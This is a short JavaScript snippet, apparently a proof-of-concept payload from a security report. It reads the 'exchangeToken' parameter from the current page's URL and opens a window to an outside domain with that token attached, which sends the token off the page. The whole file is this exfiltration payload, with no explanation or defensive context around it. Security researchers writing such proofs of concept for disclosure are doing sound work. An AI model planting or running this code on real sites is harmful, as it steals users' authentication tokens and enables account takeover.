var url = new URL(document.location);
var c = url.searchParams.get("exchangeToken");
window.open('https://yassineaboukir.com/?token=' + c);
